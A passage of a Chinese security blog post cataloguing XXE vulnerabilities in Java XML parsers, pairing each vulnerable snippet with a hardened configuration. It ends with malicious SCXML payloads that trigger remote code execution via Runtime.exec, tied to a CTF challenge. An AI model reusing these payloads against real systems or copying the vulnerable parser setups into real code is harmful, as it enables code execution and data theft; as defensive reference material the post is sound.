class="line">dbf.setFeature(FEATURE, true);</span><br><span class="line">FEATURE = &quot;http://xml.org/sax/features/external-parameter-entities&quot;;</span><br><span class="line">dbf.setFeature(FEATURE, false);</span><br><span class="line">FEATURE = &quot;http://xml.org/sax/features/external-general-entities&quot;;</span><br><span class="line">dbf.setFeature(FEATURE, false);</span><br><span class="line">FEATURE = &quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;;</span><br><span class="line">dbf.setFeature(FEATURE, false);</span><br><span class="line">dbf.setXIncludeAware(false);</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line">DocumentBuilder builder = dbf.newDocumentBuilder();</span><br><span class="line">// 读取xml文件内容</span><br><span class="line">FileInputStream fis = new FileInputStream(&quot;path/to/xxexml&quot;);</span><br><span class="line">InputSource is = new InputSource(fis);</span><br><span class="line">Document doc = builder.parse(is);</span><br></pre></td></tr></table></figure>
+
+<h2 id="jdom2【可回显】"><a href="#jdom2【可回显】" class="headerlink" title="jdom2【可回显】"></a>jdom2【可回显】</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.jdom<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jdom2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.6.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>漏洞：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SAXBuilder builder = new SAXBuilder();</span><br><span class="line">Document doc = builder.build(InputSource);</span><br></pre></td></tr></table></figure>
+
+<p>修复1：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SAXBuilder builder = new SAXBuilder(true);</span><br><span class="line">Document doc = builder.build(InputSource);</span><br></pre></td></tr></table></figure>
+
+<p>修复2：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SAXBuilder builder = new SAXBuilder();</span><br><span class="line">builder.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">builder.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">builder.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">builder.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);</span><br><span class="line">Document doc = builder.build(InputSource);</span><br></pre></td></tr></table></figure>
+
+<h2 id="SAXParserFactory-外带"><a href="#SAXParserFactory-外带" class="headerlink" title="SAXParserFactory[外带]"></a>SAXParserFactory[外带]</h2><p>漏洞：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">SAXParser parser = spf.newSAXParser();</span><br><span class="line">parser.parse(InputSource, (HandlerBase) null);</span><br></pre></td></tr></table></figure>
+
+<p>修复：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">spf.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">spf.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">spf.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">spf.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);</span><br><span class="line">SAXParser parser = spf.newSAXParser();</span><br><span class="line">parser.parse(InputSource, (HandlerBase) null);</span><br></pre></td></tr></table></figure>
+
+<h2 id="dom4j【可回显】"><a href="#dom4j【可回显】" class="headerlink" title="dom4j【可回显】"></a>dom4j【可回显】</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>dom4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dom4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>漏洞：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public static void SAXReader(String xml) throws DocumentException &#123;</span><br><span class="line">    SAXReader reader = new SAXReader();</span><br><span class="line">    // org.dom4j.Document document</span><br><span class="line">    reader.read(new InputSource(new StringReader(xml))); // cause xxe</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修复：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SAXReader saxReader = new SAXReader();</span><br><span class="line">saxReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);</span><br><span class="line">saxReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);</span><br><span class="line">saxReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);</span><br><span class="line">saxReader.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);</span><br><span class="line">saxReader.read(InputSource);</span><br></pre></td></tr></table></figure>
+
+<h2 id="SAXTransformerFactory-外带"><a href="#SAXTransformerFactory-外带" class="headerlink" title="SAXTransformerFactory[外带]"></a>SAXTransformerFactory[外带]</h2><p>只能打非回显的</p>
+<p>漏洞：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SAXTransformerFactory</span> <span class="variable">sf</span> <span class="operator">=</span> (SAXTransformerFactory) SAXTransformerFactory.newInstance();</span><br><span class="line"><span class="type">StreamSource</span> <span class="variable">source</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamSource</span>(InputSource);</span><br><span class="line">sf.newTransformerHandler(source);</span><br></pre></td></tr></table></figure>
+
+<p>修复：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SAXTransformerFactory</span> <span class="variable">sf</span> <span class="operator">=</span> (SAXTransformerFactory) SAXTransformerFactory.newInstance();</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="type">StreamSource</span> <span class="variable">source</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamSource</span>(InputSource);</span><br><span class="line">sf.newTransformerHandler(source);</span><br></pre></td></tr></table></figure>
+
+<h2 id="SchemaFactory【外带】"><a href="#SchemaFactory【外带】" class="headerlink" title="SchemaFactory【外带】"></a>SchemaFactory【外带】</h2><p>只能打外带</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SchemaFactory</span> <span class="variable">factory</span> <span class="operator">=</span> SchemaFactory.newInstance(<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>);</span><br><span class="line"><span class="type">StreamSource</span> <span class="variable">source</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamSource</span>(ResourceUtils.getPoc1());</span><br><span class="line"><span class="type">Schema</span> <span class="variable">schema</span> <span class="operator">=</span> factory.newSchema(InputSource);</span><br></pre></td></tr></table></figure>
+
+<p>修复：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SchemaFactory</span> <span class="variable">factory</span> <span class="operator">=</span> SchemaFactory.newInstance(<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>);</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="type">StreamSource</span> <span class="variable">source</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamSource</span>(InputSource);</span><br><span class="line"><span class="type">Schema</span> <span class="variable">schema</span> <span class="operator">=</span> factory.newSchema(source);</span><br></pre></td></tr></table></figure>
+
+<h2 id="TransformerFactory【外带】"><a href="#TransformerFactory【外带】" class="headerlink" title="TransformerFactory【外带】"></a>TransformerFactory【外带】</h2><p>只能打外带</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransformerFactory</span> <span class="variable">tf</span> <span class="operator">=</span> TransformerFactory.newInstance();</span><br><span class="line"><span class="type">StreamSource</span> <span class="variable">source</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamSource</span>(InputSource);</span><br><span class="line">tf.newTransformer().transform(source, <span class="keyword">new</span> <span class="title class_">DOMResult</span>());</span><br></pre></td></tr></table></figure>
+
+<p>修复：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransformerFactory</span> <span class="variable">tf</span> <span class="operator">=</span> TransformerFactory.newInstance();</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="type">StreamSource</span> <span class="variable">source</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamSourceInputSource</span>);</span><br><span class="line">tf.newTransformer().transform(source, <span class="keyword">new</span> <span class="title class_">DOMResult</span>());</span><br></pre></td></tr></table></figure>
+
+<h2 id="ValidatorSample【外带】"><a href="#ValidatorSample【外带】" class="headerlink" title="ValidatorSample【外带】"></a>ValidatorSample【外带】</h2><p>只能外带</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SchemaFactory factory = SchemaFactory.newInstance(&quot;http://www.w3.org/2001/XMLSchema&quot;);</span><br><span class="line">Schema schema = factory.newSchema();</span><br><span class="line">Validator validator = schema.newValidator();</span><br><span class="line">StreamSource source = new StreamSource(InputSource);</span><br><span class="line">validator.validate(source);</span><br></pre></td></tr></table></figure>
+
+<p>修复：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SchemaFactory</span> <span class="variable">factory</span> <span class="operator">=</span> SchemaFactory.newInstance(<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span>);</span><br><span class="line"><span class="type">Schema</span> <span class="variable">schema</span> <span class="operator">=</span> factory.newSchema();</span><br><span class="line"><span class="type">Validator</span> <span class="variable">validator</span> <span class="operator">=</span> schema.newValidator();</span><br><span class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="type">StreamSource</span> <span class="variable">source</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamSource</span>(InputSource);</span><br><span class="line">validator.validate(source);</span><br></pre></td></tr></table></figure>
+
+<h2 id="XMLReader【外带】"><a href="#XMLReader【外带】" class="headerlink" title="XMLReader【外带】"></a>XMLReader【外带】</h2><p>只能外带</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">XMLReader</span> <span class="variable">reader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line">reader.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(InputSource));</span><br></pre></td></tr></table></figure>
+
+<p>修复：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">XMLReader</span> <span class="variable">reader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line">reader.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">reader.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">reader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">reader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">reader.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(InputSource));</span><br></pre></td></tr></table></figure>
+
+<h2 id="Unmarshaller【无漏洞】"><a href="#Unmarshaller【无漏洞】" class="headerlink" title="Unmarshaller【无漏洞】"></a>Unmarshaller【无漏洞】</h2><p>默认不存在XXE</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">tClass</span> <span class="operator">=</span> Some.class;</span><br><span class="line"><span class="type">JAXBContext</span> <span class="variable">context</span> <span class="operator">=</span> JAXBContext.newInstance(tClass);</span><br><span class="line"><span class="type">Unmarshaller</span> <span class="variable">um</span> <span class="operator">=</span> context.createUnmarshaller();</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> um.unmarshal(inputStream);</span><br><span class="line">tClass.cast(o);</span><br></pre></td></tr></table></figure>
+
+<h2 id="scxml2【可RCE】"><a href="#scxml2【可RCE】" class="headerlink" title="scxml2【可RCE】"></a>scxml2【可RCE】</h2><p>参考</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://1diot9.github.io/2025/11/18/HDCTF2023-BabyJxAx/" >https://1diot9.github.io/2025/11/18/HDCTF2023-BabyJxAx/<i class="fas fa-external-link-alt"></i></a></p>
+<p>[<a class="link"   target="_blank" rel="noopener" href="https://boogipop.com/2023/04/24/Apache%20SCXML2%20RCE%E5%88%86%E6%9E%90/]" >https://boogipop.com/2023/04/24/Apache%20SCXML2%20RCE%E5%88%86%E6%9E%90/]<i class="fas fa-external-link-alt"></i></a>(<a class="link"   target="_blank" rel="noopener" href="https://boogipop.com/2023/04/24/Apache" >https://boogipop.com/2023/04/24/Apache<i class="fas fa-external-link-alt"></i></a> SCXML2 RCE分析&#x2F;)</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11828" >https://xz.aliyun.com/news/11828<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/bFQOFFbACv3buxQCgVFhUQ" >https://mp.weixin.qq.com/s/bFQOFFbACv3buxQCgVFhUQ<i class="fas fa-external-link-alt"></i></a></p>
+<p>NSSCTF可搜索BabyJxVx做题</p>
+<p>漏洞：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8000/1.xml&quot;</span></span><br><span class="line"><span class="type">SCXMLExecutor</span> <span class="variable">executor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SCXMLExecutor</span>();</span><br><span class="line"><span class="type">SCXML</span> <span class="variable">scxml</span> <span class="operator">=</span> SCXMLReader.read(file);</span><br><span class="line">        executor.setStateMachine(scxml);</span><br><span class="line">        executor.go();</span><br></pre></td></tr></table></figure>
+
+<p>恶意xml：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">state</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">onentry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="string">&#x27;&#x27;</span>.<span class="title function_">getClass</span>().<span class="title function_">forName</span>(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">onentry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">final</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">onexit</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">send</span> <span class="attr">hints</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">send</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">log</span> <span class="attr">expr</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">log</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">assign</span> <span class="attr">expr</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span> <span class="attr">location</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">assign</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">cancel</span> <span class="attr">sendidexpr</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">cancel</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">array</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span> <span class="attr">item</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">if</span> <span class="attr">cond</span>=<span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">onexit</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">final</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>任选一个就行</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>heihu师傅的私人笔记。wx公众号：Heihu Share</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://jlkl.github.io/2020/08/24/Java_03/" >https://jlkl.github.io/2020/08/24/Java_03/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/uVabONNWXUEF8AwumAVUOw" >XXE<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/XwmsNWMwFIKUQUV6B9KAFw" >XXE之java补充<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://zoiltin.github.io/posts/%E7%9B%B2xxe%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/" >https://zoiltin.github.io/posts/%E7%9B%B2xxe%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/bFQOFFbACv3buxQCgVFhUQ" >https://mp.weixin.qq.com/s/bFQOFFbACv3buxQCgVFhUQ<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.spoock.com/2018/10/23/java-xxe/" >https://blog.spoock.com/2018/10/23/java-xxe/<i class="fas fa-external-link-alt"></i></a></p>
+<p>[<a class="link"   target="_blank" rel="noopener" href="https://boogipop.com/2023/04/24/Apache%20SCXML2%20RCE%E5%88%86%E6%9E%90/]" >https://boogipop.com/2023/04/24/Apache%20SCXML2%20RCE%E5%88%86%E6%9E%90/]<i class="fas fa-external-link-alt"></i></a>(<a class="link"   target="_blank" rel="noopener" href="https://boogipop.com/2023/04/24/Apache" >https://boogipop.com/2023/04/24/Apache<i class="fas fa-external-link-alt"></i></a> SCXML2 RCE分析&#x2F;)</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11828" >https://xz.aliyun.com/news/11828<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/bFQOFFbACv3buxQCgVFhUQ" >https://mp.weixin.qq.com/s/bFQOFFbACv3buxQCgVFhUQ<i class="fas fa-external-link-alt"></i></a></p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                XXE整理
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/11/18/XXE整理/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">1diot9</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2025-11-18 12:47</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/11/18/HDCTF2023-BabyJxAx/"
+                                   title="HDCTF2023-BabyJxAx"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">HDCTF2023-BabyJxAx</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
